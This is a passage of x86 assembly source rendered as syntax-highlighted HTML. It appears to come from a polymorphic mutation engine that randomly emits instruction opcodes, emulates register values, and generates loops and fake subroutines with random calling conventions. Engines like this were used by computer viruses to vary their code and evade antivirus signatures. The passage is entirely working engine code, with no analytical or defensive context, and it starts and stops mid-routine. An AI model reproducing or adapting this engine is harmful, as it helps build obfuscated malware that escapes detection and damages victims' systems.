                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_ror</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_sar</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_mov_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_add_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_sub_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_mov_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_add_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_sub_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_xor_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_and_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_or_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_rol_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_ror_c</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, r1</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_add</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_sub</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_xor</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, r2</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_imul_ex</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, r2, c</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_imul_ex_c</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, c</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_btc_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_btr_c</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_bts_c</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_bswap</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; movzx/movsx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@movsxzx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; push reg/pop</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@pushrp</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; push imm/pop</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@puship</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_mul</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_imul</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_div</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_idiv</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_fpu</span><span class="sc0">

                        </span><span class="sc1">; new commands that dont need 2 dif. regs</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@cmp_i_follow</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@cmp_i_nofollow</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@callsub</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@subroutine</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_bsr</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_bsf</span><span class="sc0">

                        </span><span class="sc1">; add other commands if only different regs selected</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">REG1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG2</span><span class="sc0">      </span><span class="sc1">; r1 == r2 ?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_xchg</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_mov</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_and</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_or</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, r2, c</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_shld</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, r2, c</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_shrd</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; r1, r2</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_xadd</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@cmp_r_nofollow</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@cmp_r_follow</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x_cycle</span><span class="sc0">

                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; shouldn't be executed. fix # of items</span><span class="sc0">

</span><span class="sc5">@@poly_cmd_exit</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; exit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; pushad_edi</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; --------------------- cycle -----------------------------------------------</span><span class="sc0">

</span><span class="sc5">@@x_cycle</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_CYCLE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; start-cycle: eip</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@gen_sub</span><span class="sc0">

</span><span class="sc5">@@gen_add</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c081h</span><span class="sc0">      </span><span class="sc1">; add reg, param</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@gen_done</span><span class="sc0">

</span><span class="sc5">@@gen_sub</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e881h</span><span class="sc0">      </span><span class="sc1">; sub reg, param</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc5">XXX</span><span class="sc0">             </span><span class="sc1">; 4emul: add-&gt;sub</span><span class="sc0">
</span><span class="sc5">@@gen_done</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">666</span><span class="sc0">        </span><span class="sc1">; its enough</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; # of cycle iterations</span><span class="sc0">

</span><span class="sc5">@@em_add</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">XXX</span><span class="sc0"> </span><span class="sc1">; calc resulting value</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@em_add</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F881h</span><span class="sc0">      </span><span class="sc1">; cmp r,result</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG1_8</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">em_reg</span><span class="sc4">[</span><span class="sc5">REG1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">850Fh</span><span class="sc0">       </span><span class="sc1">; jne</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; start-cycle: eip</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; --------------------- call subroutine -------------------------------------</span><span class="sc0">

</span><span class="sc5">@@callsub</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_SUBROUTINE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">p_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; no subs were generated yet?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">     </span><span class="sc1">; !</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">in_subroutine</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; do not make recurse calls</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">     </span><span class="sc1">; !</span><span class="sc0">

</span><span class="sc1">; select random sub; get addr &amp; stack size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_count</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_addr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_stack</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; push params</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@skip_push_rnd</span><span class="sc0">

</span><span class="sc5">@@push_rnd</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@push_rnd</span><span class="sc0">
</span><span class="sc5">@@skip_push_rnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; generate call</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_conv</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@skip_fixstk</span><span class="sc0">           </span><span class="sc1">; 0=pascal</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_stack</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@skip_fixstk</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C483h</span><span class="sc0">      </span><span class="sc1">; add esp, nn</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@skip_fixstk</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0"> </span><span class="sc1">; add--&gt;sub</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; -nn</span><span class="sc0">
</span><span class="sc5">@@skip_fixstk</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">

</span><span class="sc1">; --------------------- generate subroutine ---------------------------------</span><span class="sc0">

</span><span class="sc5">@@subroutine</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc5">testcmd2</span><span class="sc0"> </span><span class="sc5">CMD2_SUBROUTINE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@poly_cmd_restart</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">p_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">C_MAX_SUB</span><span class="sc0"> </span><span class="sc1">; fixed # of subroutines</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@@poly_cmd_exit</span><span class="sc0">    </span><span class="sc1">; !</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">in_subroutine</span><span class="sc0"> </span><span class="sc1">; we're inside of subroutine(s)</span><span class="sc0">

</span><span class="sc1">; now, push all the state related to output code flow generation</span><span class="sc0">

                        </span><span class="sc5">flagsnz</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@s_no_jmps</span><span class="sc0"> </span><span class="sc1">; cant be called?</span><span class="sc0">

                        </span><span class="sc1">; if jmps allowed, gen sub somewhere there</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; current EIP</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@eip_do1</span><span class="sc0"> </span><span class="sc1">; change EIP (requres FLAG_NOJMPS=0)</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@s_done</span><span class="sc0">

</span><span class="sc5">@@s_no_jmps</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; NOJMPS? bypass subroutine</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; current EIP</span><span class="sc0">
</span><span class="sc5">@@s_done</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@state_push</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; ECX&lt;--number of paramz</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">        </span><span class="sc1">; have any params?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@set0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; 1..4</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@set0</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; save addr(EDI) &amp; params(CL)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_count</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">p_count</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">p_addr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">p_stack</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

                        </span><span class="sc1">; calling convention: cdecl=1, pascal=0</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_zf</span><span class="sc0">
                        </span><span class="sc6">sete</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">p_conv</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">; cdecl=0, pascal=-1</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">          </span><span class="sc1">; if (cdecl) pop_params=0</span><span class="sc0">

                        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; params size, in BYTEs</span><span class="sc0">

</span><span class="sc1">; reinitialize the state</span><span class="sc0">

</span><span class="sc1">; reduce set of registers available</span><span class="sc0">
</span><span class="sc5">@@rnd_again</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@rnd_eax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regavail</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@rnd_again</span><span class="sc0">
